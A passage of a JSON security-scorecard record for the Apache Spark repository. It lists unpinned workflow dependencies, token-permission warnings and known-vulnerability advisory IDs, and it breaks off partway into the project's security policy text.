                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:586: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:598: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:602: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:607: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:612: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:641: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:658: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:668: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:675: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:684: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:1015: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:1028: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:1038: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:1045: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:1055: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:1061: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:1151: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:1153: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:226: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:241: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:251: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:263: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:268: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:298: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:304: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:416: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:434: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:444: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:454: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:484: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:492: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:499: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_infra_images_cache.yml:41: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_infra_images_cache.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build_infra_images_cache.yml:43: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_infra_images_cache.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build_infra_images_cache.yml:45: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_infra_images_cache.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build_infra_images_cache.yml:47: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_infra_images_cache.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build_infra_images_cache.yml:54: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_infra_images_cache.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_python_connect.yml:35: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_python_connect.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_python_connect.yml:37: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_python_connect.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_python_connect.yml:47: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_python_connect.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_python_connect.yml:54: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_python_connect.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_python_connect.yml:59: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_python_connect.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_python_connect.yml:116: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_python_connect.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_python_connect.yml:122: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_python_connect.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_python_connect35.yml:35: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_python_connect35.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_python_connect35.yml:39: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_python_connect35.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_python_connect35.yml:49: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_python_connect35.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_python_connect35.yml:56: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_python_connect35.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_python_connect35.yml:61: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_python_connect35.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_python_connect35.yml:104: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_python_connect35.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_python_connect35.yml:110: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_python_connect35.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_sparkr_window.yml:33: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_sparkr_window.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_sparkr_window.yml:40: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_sparkr_window.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_sparkr_window.yml:42: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_sparkr_window.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_sparkr_window.yml:49: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_sparkr_window.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build_sparkr_window.yml:54: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_sparkr_window.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_sparkr_window.yml:67: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_sparkr_window.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/labeler.yml:37: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/labeler.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/maven_test.yml:131: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/maven_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/maven_test.yml:146: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/maven_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/maven_test.yml:156: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/maven_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/maven_test.yml:163: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/maven_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/maven_test.yml:168: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/maven_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/maven_test.yml:211: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/maven_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/maven_test.yml:217: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/maven_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/notify_test_workflow.yml:39: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/notify_test_workflow.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pages.yml:46: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/pages.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pages.yml:51: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/pages.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pages.yml:56: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/pages.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/pages.yml:69: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/pages.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pages.yml:91: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/pages.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pages.yml:93: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/pages.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pages.yml:98: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/pages.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish_snapshot.yml:44: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/publish_snapshot.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish_snapshot.yml:48: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/publish_snapshot.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish_snapshot.yml:56: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/publish_snapshot.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish_snapshot.yml:62: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/publish_snapshot.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/update_build_status.yml:35: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/update_build_status.yml/master?enable=pin",
                        "Warn: containerImage not pinned by hash: binder/Dockerfile:18: pin your Docker image by updating python:3.10-slim to python:3.10-slim@sha256:eb9ca77b1a0ffbde84c1dc333beb3490a2638813cc25a339f8575668855b9ff1",
                        "Warn: containerImage not pinned by hash: dev/create-release/spark-rm/Dockerfile:19: pin your Docker image by updating ubuntu:jammy-20240227 to ubuntu:jammy-20240227@sha256:77906da86b60585ce12215807090eb327e7386c8fafb5402369e421f44eff17e",
                        "Warn: containerImage not pinned by hash: dev/infra/Dockerfile:20: pin your Docker image by updating ubuntu:jammy-20240911.1 to ubuntu:jammy-20240911.1@sha256:0e5e4a57c2499249aafc3b40fcd541e9a456aab7296681a3994d631587203f97",
                        "Warn: containerImage not pinned by hash: resource-managers/kubernetes/docker/src/main/dockerfiles/spark/Dockerfile:19",
                        "Warn: containerImage not pinned by hash: resource-managers/kubernetes/docker/src/main/dockerfiles/spark/bindings/R/Dockerfile:20",
                        "Warn: containerImage not pinned by hash: resource-managers/kubernetes/docker/src/main/dockerfiles/spark/bindings/python/Dockerfile:20",
                        "Warn: pipCommand not pinned by hash: binder/Dockerfile:20",
                        "Warn: pipCommand not pinned by hash: resource-managers/kubernetes/docker/src/main/dockerfiles/spark/bindings/python/Dockerfile:32-36",
                        "Warn: pipCommand not pinned by hash: binder/postBuild:41",
                        "Warn: pipCommand not pinned by hash: binder/postBuild:43",
                        "Warn: pipCommand not pinned by hash: dev/run-pip-tests:103",
                        "Warn: pipCommand not pinned by hash: sql/create-docs.sh:37",
                        "Warn: npmCommand not pinned by hash: .github/workflows/build_and_test.yml:1160",
                        "Warn: pipCommand not pinned by hash: .github/workflows/build_python_connect.yml:73",
                        "Warn: pipCommand not pinned by hash: .github/workflows/build_python_connect.yml:74",
                        "Warn: pipCommand not pinned by hash: .github/workflows/build_python_connect35.yml:70",
                        "Warn: pipCommand not pinned by hash: .github/workflows/build_python_connect35.yml:73",
                        "Warn: pipCommand not pinned by hash: .github/workflows/build_python_connect35.yml:76",
                        "Warn: pipCommand not pinned by hash: .github/workflows/pages.yml:63",
                        "Info:   1 out of 107 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   2 out of  17 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of  12 pipCommand dependencies pinned",
                        "Info:   1 out of   2 npmCommand dependencies pinned",
                        "Info:   0 out of   6 containerImage dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: no pull requests merged into dev branch"
                    ],
                    "score": 0,
                    "reason": "no SAST tool detected",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: docs/security.md:1",
                        "Info: Found linked content: docs/security.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: docs/security.md:1",
                        "Info: Found text in security policy: docs/security.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: jobLevel 'packages' permission set to 'write': .github/workflows/build_branch35.yml:29",
                        "Warn: jobLevel 'packages' permission set to 'write': .github/workflows/build_branch35_python.yml:29",
                        "Warn: jobLevel 'packages' permission set to 'write': .github/workflows/build_coverage.yml:29",
                        "Warn: jobLevel 'packages' permission set to 'write': .github/workflows/build_java21.yml:29",
                        "Warn: jobLevel 'packages' permission set to 'write': .github/workflows/build_main.yml:30",
                        "Warn: jobLevel 'packages' permission set to 'write': .github/workflows/build_maven.yml:29",
                        "Warn: jobLevel 'packages' permission set to 'write': .github/workflows/build_maven_java21.yml:29",
                        "Warn: jobLevel 'packages' permission set to 'write': .github/workflows/build_maven_java21_macos15.yml:29",
                        "Warn: jobLevel 'packages' permission set to 'write': .github/workflows/build_non_ansi.yml:29",
                        "Warn: jobLevel 'packages' permission set to 'write': .github/workflows/build_python_3.10.yml:29",
                        "Warn: jobLevel 'packages' permission set to 'write': .github/workflows/build_python_3.12.yml:29",
                        "Warn: jobLevel 'packages' permission set to 'write': .github/workflows/build_python_3.13.yml:29",
                        "Warn: jobLevel 'packages' permission set to 'write': .github/workflows/build_python_3.9.yml:29",
                        "Warn: jobLevel 'packages' permission set to 'write': .github/workflows/build_python_pypy3.10.yml:29",
                        "Warn: jobLevel 'packages' permission set to 'write': .github/workflows/build_rockdb_as_ui_backend.yml:29",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/labeler.yml:34",
                        "Info: jobLevel 'actions' permission set to 'read': .github/workflows/notify_test_workflow.yml:35",
                        "Warn: jobLevel 'checks' permission set to 'write': .github/workflows/notify_test_workflow.yml:36",
                        "Info: jobLevel 'actions' permission set to 'read': .github/workflows/update_build_status.yml:31",
                        "Warn: jobLevel 'checks' permission set to 'write': .github/workflows/update_build_status.yml:32",
                        "Warn: no topLevel permission defined: .github/workflows/benchmark.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/build_and_test.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/build_branch35.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/build_branch35_python.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/build_coverage.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/build_infra_images_cache.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/build_java21.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/build_main.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/build_maven.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/build_maven_java21.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/build_maven_java21_macos15.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/build_non_ansi.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/build_python_3.10.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/build_python_3.12.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/build_python_3.13.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/build_python_3.9.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/build_python_connect.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/build_python_connect35.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/build_python_pypy3.10.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/build_rockdb_as_ui_backend.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/build_sparkr_window.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/labeler.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/maven_test.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/notify_test_workflow.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/pages.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/publish_snapshot.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/stale.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/test_report.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/update_build_status.yml:1"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": [
                        "Warn: Project is vulnerable to: GHSA-735f-pc8j-v9w8",
                        "Warn: Project is vulnerable to: GHSA-c28r-hw5m-5gv3",
                        "Warn: Project is vulnerable to: GHSA-5mg8-w23w-74h3",
                        "Warn: Project is vulnerable to: GHSA-7g45-4rm6-3mm3",
                        "Warn: Project is vulnerable to: GHSA-4gg5-vx3j-xwc7",
                        "Warn: Project is vulnerable to: GHSA-77rm-9x9h-xj3g",
                        "Warn: Project is vulnerable to: GHSA-g5ww-5jh7-63cx",
                        "Warn: Project is vulnerable to: GHSA-h4h5-3hr4-j3g2",
                        "Warn: Project is vulnerable to: GHSA-wrvw-hg22-4m67",
                        "Warn: Project is vulnerable to: GHSA-7r82-7xv7-xcpj",
                        "Warn: Project is vulnerable to: GHSA-264p-99wq-f4j6",
                        "Warn: Project is vulnerable to: GHSA-qh8g-58pp-2wxh",
                        "Warn: Project is vulnerable to: GHSA-fj7x-q9j7-g6q6 / PYSEC-2024-48",
                        "Warn: Project is vulnerable to: GHSA-3v79-q7ph-j75h",
                        "Warn: Project is vulnerable to: GHSA-43c4-9qgj-x742",
                        "Warn: Project is vulnerable to: GHSA-4qq5-mxxx-m6gg",
                        "Warn: Project is vulnerable to: GHSA-554w-xh4j-8w64 / PYSEC-2023-253",
                        "Warn: Project is vulnerable to: GHSA-59v3-898r-qwhj",
                        "Warn: Project is vulnerable to: GHSA-5mvj-wmgj-7q8c",
                        "Warn: Project is vulnerable to: GHSA-5p3h-7fwh-92rc",
                        "Warn: Project is vulnerable to: GHSA-5q6c-ffvg-xcm9",
                        "Warn: Project is vulnerable to: GHSA-5r3q-93q3-f978 / PYSEC-2023-252",
                        "Warn: Project is vulnerable to: GHSA-6749-m5cp-6cg7",
                        "Warn: Project is vulnerable to: GHSA-76cg-cfhx-373f",
                        "Warn: Project is vulnerable to: GHSA-7p8j-qv6x-f4g4",
                        "Warn: Project is vulnerable to: GHSA-8f8q-q2j7-7j2m",
                        "Warn: Project is vulnerable to: GHSA-cv6c-7963-wxcg",
                        "Warn: Project is vulnerable to: GHSA-cxfr-5q3r-2rc2",
                        "Warn: Project is vulnerable to: GHSA-f42m-mvfv-cgw5",
                        "Warn: Project is vulnerable to: GHSA-f798-qm4r-23r5",
                        "Warn: Project is vulnerable to: GHSA-f82r-jj5r-6g97",
                        "Warn: Project is vulnerable to: GHSA-ffw3-6378-cqgp",
                        "Warn: Project is vulnerable to: GHSA-fmxj-6h9g-6vw3",
                        "Warn: Project is vulnerable to: GHSA-ghv6-9r9j-wh4j",
                        "Warn: Project is vulnerable to: GHSA-hh8p-p8mp-gqhm",
                        "Warn: Project is vulnerable to: GHSA-hq88-wg7q-gp4g",
                        "Warn: Project is vulnerable to: GHSA-hvc6-42vf-jhf8",
                        "Warn: Project is vulnerable to: GHSA-j46q-5pxx-8vmw",
                        "Warn: Project is vulnerable to: GHSA-j62r-wxqq-f3gf",
                        "Warn: Project is vulnerable to: GHSA-j8mg-pqc5-x9gj",
                        "Warn: Project is vulnerable to: GHSA-m49c-5c52-6696",
                        "Warn: Project is vulnerable to: GHSA-p4jx-q62p-x5jr",
                        "Warn: Project is vulnerable to: GHSA-pqcv-qw2r-r859",
                        "Warn: Project is vulnerable to: GHSA-qg8p-32gr-gh6x",
                        "Warn: Project is vulnerable to: GHSA-v945-r3rc-6fjm",
                        "Warn: Project is vulnerable to: GHSA-vwhf-3v6x-wff8 / PYSEC-2023-260",
                        "Warn: Project is vulnerable to: GHSA-wf7f-8fxf-xfxc",
                        "Warn: Project is vulnerable to: GHSA-wqxf-447m-6f5f",
                        "Warn: Project is vulnerable to: GHSA-wv8q-4f85-2p8p",
                        "Warn: Project is vulnerable to: GHSA-x38x-g6gr-jqff",
                        "Warn: Project is vulnerable to: GHSA-5wvp-7f3h-6wmm / PYSEC-2023-238",
                        "Warn: Project is vulnerable to: GHSA-2rxp-v6pw-ch6m",
                        "Warn: Project is vulnerable to: GHSA-4xqq-m2hx-25v8 / GHSA-r55c-59qm-vjw6 / GHSA-vg3r-rm7w-2xgh",
                        "Warn: Project is vulnerable to: GHSA-5866-49gr-22v4",
                        "Warn: Project is vulnerable to: GHSA-vmwr-mc7x-5vc3",
                        "Warn: Project is vulnerable to: GHSA-6f62-3596-g6w7",
                        "Warn: Project is vulnerable to: GHSA-rcjc-c4pj-xxrp",
                        "Warn: Project is vulnerable to: GHSA-c27h-mcmw-48hv",
                        "Warn: Project is vulnerable to: GHSA-r6j9-8759-g62w",
                        "Warn: Project is vulnerable to: GHSA-w33c-445m-f8w7",
                        "Warn: Project is vulnerable to: GHSA-8qv5-68g4-248j",
                        "Warn: Project is vulnerable to: GHSA-59j4-wjwp-mw9m",
                        "Warn: Project is vulnerable to: GHSA-952p-6rrq-rcjv"
                    ],
                    "score": 0,
                    "reason": "63 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/apache/spark/contents/docs/security.md",
        "SecurityPolicy_content": "---\nlayout: global\ndisplayTitle: Spark Security\ntitle: Security\nlicense: |\n  Licensed to the Apache Software Foundation (ASF) under one or more\n  contributor license agreements.  See the NOTICE file distributed with\n  this work for additional information regarding copyright ownership.\n  The ASF licenses this file to You under the Apache License, Version 2.0\n  (the \"License\"); you may not use this file except in compliance with\n  the License.  You may obtain a copy of the License at\n\n     http://www.apache.org/licenses/LICENSE-2.0\n\n  Unless required by applicable law or agreed to in writing, software\n  distributed under the License is distributed on an \"AS IS\" BASIS,\n  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n  See the License for the specific language governing permissions and\n  limitations under the License.\n---\n* This will become a table of contents (this text will be scraped).\n{:toc}\n\n# Spark Security: Things You Need To Know\n\nSecurity features like authentication are not enabled by default. When deploying a cluster that is open to the internet\nor an untrusted network, it's important to secure access to the cluster to prevent unauthorized applications\nfrom running on the cluster.\n\nSpark supports multiple deployments types and each one supports different levels of security. Not\nall deployment types will be secure in all environments and none are secure by default. Be\nsure to evaluate your environment, what Spark supports, and take the appropriate measure to secure\nyour Spark deployment.\n\nThere are many different types of security concerns. Spark does not necessarily protect against\nall things. Listed below are some of the things Spark supports. Also check the deployment\ndocumentation for the type of deployment you are using for deployment specific settings. Anything\nnot documented, Spark does not 